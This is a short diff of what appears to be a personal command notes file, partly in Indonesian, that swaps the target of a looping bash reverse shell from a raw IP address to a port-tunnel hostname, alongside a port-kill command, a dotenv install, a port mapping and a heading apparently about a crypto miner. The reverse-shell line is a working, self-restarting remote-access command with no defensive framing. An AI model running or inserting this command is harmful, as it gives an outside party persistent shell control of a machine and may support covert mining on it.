@@ -1,6 +1,6 @@
 fuser -k 4055/tcp
 npm i dotenv (install modul dotenv di node)
-while true; do bash -c 'bash -i >& /dev/tcp/35.247.34.178/4053 0>&1'; sleep 10; done
+while true; do bash -c 'bash -i >& /dev/tcp/evaldana-36710.portmap.host/22703 0>&1'; sleep 10; done
 evaldana-36710.portmap.host:22703 => 4050
 #### dependence ccmine
 
